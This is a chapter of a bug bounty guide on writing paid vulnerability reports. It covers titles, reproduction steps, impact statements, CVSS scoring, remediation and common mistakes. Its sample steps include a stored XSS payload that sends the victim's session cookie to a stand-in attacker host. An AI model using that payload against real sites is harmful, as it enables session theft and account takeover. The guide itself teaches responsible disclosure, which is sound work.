# 05 — Writing Reports That Pay

A mediocre report on a great bug gets "Not Applicable" or pays at the floor of its severity. A great report on the same bug pays at the ceiling. **Your report is the product.**

## The anatomy of a report that pays

### 1. Title (one line)

**Bad:** "XSS on target.com"
**Good:** "Stored XSS in profile bio field leading to account takeover via session cookie theft"

The title encodes: **where**, **what**, **impact**. Triagers skim hundreds of reports — yours must telegraph severity in 10 words.

### 2. Summary (2-3 sentences)

Lead with impact. What does this bug let an attacker do, and against whom?

> An attacker can inject arbitrary JavaScript into the profile bio field. When any user views the attacker's profile, the JS executes in their browser, allowing the attacker to steal session cookies and take over the victim's account.

### 3. Steps to reproduce (numbered, copy-pasteable)

Every step must be:
- Numbered
- Exact (URLs, payloads, button clicks — spelled out)
- Copy-pasteable (payloads in code blocks)
- Reproducible by someone who has never seen the app

**Bad:**
> 1. Go to profile
> 2. Put XSS payload
> 3. It fires

**Good:**
```
1. Log in at https://app.target.com/login as attacker account (user1@test.com / Password123!)
2. Navigate to https://app.target.com/settings/profile
3. In the "Bio" field, paste the following payload:

    <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

4. Click "Save Changes"
5. Response: 200 OK, bio is stored server-side (verify via: GET /api/users/me)
6. From a different browser, log in as victim (user2@test.com / Password456!)
7. Navigate to attacker's profile: https://app.target.com/u/user1
8. Attack fires — request is made to https://attacker.com/steal?c=session=xyz123...
9. Attacker now has victim's session cookie and can take over the account.
```

### 4. Proof of impact (screenshots + video if possible)

- Screenshot of the payload submitted
- Screenshot of the payload firing
- Screenshot of the stolen data (session cookie, sensitive data, admin action performed)
- **Video** (Loom / asciinema) for complex multi-step bugs — doubles your bounty probability

### 5. Impact statement

Quantify. What can an attacker do, to whom, at what scale?

> **Impact:**
> - Attacker can take over any user account that views their profile
> - Profile view counts from public data suggest ~50,000 profile views/day → mass account compromise possible
> - Victim data at risk: email, name, payment methods, private messages
> - No user interaction required beyond viewing the profile (no click required)
> - Severity: **HIGH** (stored XSS + account takeover impact)

### 6. Remediation suggestion (short)

Triagers love this. Shows you understand the bug and aren't just throwing payloads at walls.

> **Remediation:**
> - Sanitize HTML output of bio field — use DOMPurify or an HTML entity encoder on render
> - Set `Content-Security-Policy` headers to restrict inline scripts
> - Consider adding `HttpOnly` flag to session cookies to prevent JS access

### 7. References (optional but professional)

- CWE-79 (Cross-Site Scripting): https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- PortSwigger labs demonstrating this bug class: https://portswigger.net/web-security/cross-site-scripting

---

## Severity & CVSS (optional but earns points)

Compute a CVSS 3.1 score: https://www.first.org/cvss/calculator/3.1

For the XSS example above:
- AV:N (network accessible), AC:L (low complexity), PR:L (requires user account), UI:R (victim must view profile), S:C (scope change: steals cookies affecting adjacent accounts), C:H (confidentiality high — full session access), I:H (integrity high), A:L (can lock out users)
- **Score:** 8.3 / HIGH

Include this in the report. Programs with structured severity scales will often match their internal scale to CVSS.

---

## Common report mistakes that cost money

### ❌ "This *might* be exploitable"
Triagers read 100 reports a week. If you're uncertain, they assume no impact and close as Informational. **Prove exploitability before submitting.** If you can't exploit it end-to-end, don't submit yet.

### ❌ Missing impact
"I can inject HTML into this page." → So what? Show what that lets you do to real users, not theoretical possibilities.

### ❌ Too much theory
Triagers know what XSS is. Don't explain the bug class — explain *your* finding.

### ❌ Chained assumptions
"If the admin clicks this link, and is using Chrome, and has a specific extension..." → Break this into the **minimal** reliable reproduction. Each added precondition halves the severity.

### ❌ Out of scope
Read the scope page. Every time. Before submitting. Out-of-scope reports waste everyone's time and hurt your stats.

### ❌ Duplicates
Before submitting, search the program's published reports (HackerOne Hacktivity, Bugcrowd disclosure lists) for keywords from your finding. If someone found the same thing last week, you're a dup.

---

## The art of getting the bounty bumped

After submitting and getting triaged, if you disagree with severity:

1. **Demonstrate additional impact** — can you chain this with another finding to escalate?
2. **Provide more context** — show how the bug affects business-critical users or features, not just average users
3. **Escalate politely, with evidence** — "I think this warrants a re-eval because [specific new PoC showing extended impact]"

Don't argue for the sake of arguing. The triage team sees 100 reports a week. If you're polite, evidence-driven, and respect their process, they'll bump legitimate cases.

---

## Templates in this toolkit

Use these as your starting point:

- **`../templates/vulnerability-report.md`** — HackerOne / Bugcrowd submission format
- **`../templates/audit-report.md`** — Client-facing (Upwork) engagement report
- **`../templates/retest-report.md`** — Verifying prior findings are fixed

---

## Example: a real disclosed report

Read 20 of these before writing your first. [HackerOne Hacktivity](https://hackerone.com/hacktivity) shows you exactly what pays — click through to see submission → triage → bounty.

**Gold-standard reports to learn from:**
- https://hackerone.com/reports/341876 (Shopify, $15,250)
- https://hackerone.com/reports/1121737 (TikTok, $5,950)
- https://hackerone.com/reports/1037532 (GitLab, $12,000)

Notice how each follows the structure above: clear title, impact summary, reproducible steps, screenshots/videos, remediation.

## Next

[`06-upwork-guide.md`](06-upwork-guide.md) — how to turn these skills into Upwork income.
